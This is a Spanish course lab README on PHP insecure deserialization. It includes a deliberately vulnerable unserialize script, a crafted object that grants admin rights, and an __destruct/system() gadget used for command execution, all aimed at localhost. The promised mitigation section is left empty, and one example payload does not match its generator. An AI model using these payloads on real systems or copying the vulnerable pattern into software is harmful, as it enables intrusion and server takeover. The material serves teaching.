# PPS-Unidad3Actividad-DeserializacionInsegura
Explotación y Mitigación de vulnerabilidad de Deserialización Insegura
Tenemos como objetivo:

> - Ver cómo se pueden hacer ataques de Deserialización insegura.
>
> - Analizar el código de la aplicación que permite ataques de Deserialización insegura.
>
> - Explorar la deserialización insegura y mitigarlo con JSON
>
> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.


## ¿Qué es Unsafe Deserialization?
---

La deserialización insegura ocurre cuando una aplicación carga objetos serializados sin validación, lo que permite que un atacante modifique los datos y ejecute código arbitrario.

Impacto de la Deserialización Insegura:

• Escalada de privilegios (ejemplo: convertir un usuario normal en administrador).

• Ejecución de código remoto (RCE) si la aplicación permite __wakeup() o __destruct().

• Modificación de datos internos en la aplicación.



## ACTIVIDADES A REALIZAR
---
> Lee detenidamente la sección de vulnerabilidades de subida de archivos.  de la página de PortWigger <https://portswigger.net/web-security/deserialization>
>
> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionDeserializacionInsegura.pdf)
> 


Vamos realizando operaciones:

### Iniciar entorno de pruebas

-Situáte en la carpeta de del entorno de pruebas de nuestro servidor LAMP e inicia el esce>

~~~
docker-compose up -d
~~~


## Código vulnerable
---

Crear el archivo vulnerable: deserialize.php

~~~
<?php
	class User {
		public $username;
		public $isAdmin = false;
	}
	$data = unserialize($_GET['data']);
	if ($data->isAdmin) {
		echo "¡Acceso de administrador concedido!";
	}
?>
~~~
El código deserializa datos de usuario sin validación (unserialize($_GET['data'])) y permite modificar el objeto y otorgar privilegios no autorizados.


### Explotación de Deserialización Insegura
---

**Crear un objeto malicioso en PHP**

Crear el archivo **ejemploDeserializacion.php**  y ejecutar este código en la máquina atacante:

~~~
<?php
class User {
	public $username = "hacker";
	public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>
~~~

Salida esperada (ejemplo):

`O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D`

![](images/UD1.png)

**Enviar el objeto malicioso a la aplicación**

- Copiar la salida obtenida

- Acceder a esta URL en el navegador `http://localhost/deserialize.php?data=` y concatenarla con el código obtenido:

~~
http://localhost/deserialize.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D

O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D

Si la aplicación es vulnerable, debería mostrar:

¡Acceso de administrador concedido!

![](images/UD2.png)


**Intentar RCE con __destruct()**

Si la clase User tiene un método __destruct(), se puede abusar para ejecutar código en el servidor.

Previamente añadimos al fichero deserialize.php

~~~
class Exploit {
	public $cmd;
	public function __destruct() {
		system($this->cmd);
	}
}
~~~

Luego creamos el fichero php malicioso

~~~
<?php
class Exploit {
	public $cmd;
	public function __destruct() {
		system($this->cmd);
	}
}
$exploit = new Exploit();
$exploit->cmd = "whoami";
echo urlencode(serialize($exploit));
?>
~~~

Ejemplo de salida:
O%3A7%3A%22Exploit%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D
Enviar este payload a la aplicación:
http://localhost/deserialize.php?data=O%3A7%3A%22Exploit%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A
2%3A%22id%22%3B%7D
Si la aplicación es vulnerable y ejecuta system(), se puede ejecutar comandos en el servidor. En nuestro caso
ejecuta whoami devolviendo www-data
---


![](images/UD.png)
![](images/UD.png)
![](images/UD.png)
![](images/UD.png)
![](images/UD.png)
![](images/UD.png)

Aquí está el código securizado:

🔒 Medidas de seguridad implementadas

- :

        - 

        - 



🚀 Resultado

✔ 

✔ 

✔ 

## ENTREGA

> __Realiza las operaciones indicadas__

> __Crea un repositorio  con nombre PPS-Unidad3Actividad6-Tu-Nombre donde documentes la realización de ellos.__

> No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.

> __Sube a la plataforma, tanto el repositorio comprimido como la dirección https a tu repositorio de Github.__

